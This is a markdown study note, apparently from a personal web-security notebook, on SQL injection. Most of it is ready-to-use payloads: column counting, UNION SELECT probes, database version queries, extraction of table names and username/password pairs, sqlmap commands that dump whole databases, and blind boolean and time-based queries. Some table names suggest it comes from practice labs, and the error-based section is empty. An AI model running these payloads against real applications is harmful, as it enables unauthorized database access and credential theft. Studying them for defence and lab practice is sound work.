---
title: SQL Injection
description: Attacks using SQL qury
---
## Types of SQL Injection
- In-band injection
	- error based
	- union based
- Out-of-band
- Blind injection
	- Boolean based
	- Time based
## Exploit
### In-band injection
#### Testing for SQLi
Basic:
```sql
' and 1=1--
' and 1=2--
```

Mathematical expression:
```sql
1+1
```

Fuzz to find payload. Use `Generic-SQLi.txt`
#### Determining number of columns
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
...
```

#### Find column with useful data type
Sometimes a column return NULL, find the string type column
```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
#### Database version
oracle:
```sql
' UNION SELECT NULL FROM DUAL--
' UNION SELECT banner,NULL FROM v$version--
```

mysql & microsoft:
```sql
-- 2 columns
' UNION SELECT NULL, @@version #
```

#### Database content
Get table name:
```sql
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
```

Get column name:
```sql
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name+=+'users_gqgpsx'--
```

Get table content:
```sql
'+UNION+SELECT+username_rtrsqw,+password_wipatx+FROM+users_gqgpsx--
```

#### Multiple values in a column
```sql
' UNION SELECT NULL, username|| '~' ||password from users--
```

oracle
```sql
'+UNION+SELECT+table_name,+NULL+FROM+all_tables--
'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_CIMWEI'--
'+UNION+SELECT+USERNAME_IJRSPK,+PASSWORD_WSSNNP+FROM+USERS_CIMWEI--
```

#### sqlmap
Get database name:
```bash
sqlmap <url> --dbs
```

Get table:
```bash
sqlmap <url> -D <database name> --tab
```

Data dump
```bash
sqlmap <url> -D <database name> -T <tablename> --batch --dump
```

Scanning HTTP request
```bash
sqlmap -r request.txt
```

### Blind injection
#### Boolean-based 
```sql
' AND 1=1 -- - 
```

```sql
' AND 1=2 -- -
```

#### Time-based 
```sql
SELECT SLEEP(10)
```

#### Error-based
Trigger error to trigger behavioural changes
```sql

```

Query SQL example
```sql
-- Simple SQL statements
SELECT * FROM users;
SELECT * FROM users WHERE username = 'Jessamy';
SELECT * FROM users WHERE username = 'Jessamy' and password = 'password123';
SELECT * FROM users WHERE username = 'Jessamy'-- ' and password = 'password123';

-- Substring
SELECT database()
SELECT substring(database(),1,1)

-- Booleans
SELECT * FROM products WHERE name = 'Laptop' AND 1=1;
SELECT * FROM products WHERE name = 'Laptop' AND 1=2;

-- Time delays
SELECT * FROM products WHERE name = 'Laptop' AND SLEEP(5);

-- Time delay substring
SELECT database()
SELECT IF(1=1,SLEEP(5),'a')
SELECT IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),'a')
SELECT IF(SUBSTRING((SELECT database()),1,1)='t',SLEEP(5),'a')
SELECT * FROM products WHERE name = 'Laptop' AND IF(1=1,SLEEP(5),'a')

-- Errors
SELECT IF(SUBSTRING((SELECT database()),1,1)='a',(SELECT table_name FROM information_schema.tables),'a')
SELECT IF(SUBSTRING((SELECT database()),1,1)='t',(SELECT table_name FROM information_schema.tables),'a')
```
## Links
- [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Understanding SQLi Payloads](https://www.db-fiddle.com/f/nLpyQDMd49iRygnY9H7CB8/5)
